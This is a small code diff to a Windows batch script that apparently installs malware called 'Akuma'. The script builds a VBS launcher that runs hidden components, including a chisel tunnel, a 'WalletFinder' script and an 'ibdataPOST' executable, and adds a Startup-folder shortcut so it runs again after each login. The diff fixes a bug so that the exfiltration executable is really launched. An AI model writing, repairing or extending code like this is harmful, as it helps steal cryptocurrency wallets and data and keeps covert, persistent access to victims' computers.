@@ -27,7 +27,7 @@ echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\
 echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\network.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\WalletFinder.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
-echo objShell.Run "%homedrive%\Akuma\ibdataPOST.exe", 0, False >> %homedrive%\Akuma\ibdataPOST.exe
+echo objShell.Run "%homedrive%\Akuma\ibdataPOST.exe", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo y| del "%homedrive%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
 start %homedrive%\Akuma\Akuma.vbs
